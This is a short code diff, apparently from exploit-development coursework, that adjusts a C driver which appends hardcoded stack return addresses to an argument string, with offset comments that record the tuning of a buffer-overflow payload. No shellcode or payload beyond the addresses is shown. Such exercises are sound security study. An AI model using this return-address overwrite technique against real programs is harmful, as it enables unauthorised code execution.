@@ -27,7 +27,13 @@ int main(void)
   {
   	// strcat(str, "\x2c\xfb\xff\xbf");
   	// strcat(str, "\x20\xfb\xff\xbf");
+
+    // - 151
   	strcat(str, "\x6f\xfb\xff\xbf");
+    // - 153
+  	strcat(str, "\x6d\xfb\xff\xbf");
+
+
     // bffffbd4
   }
   args[1] = str;
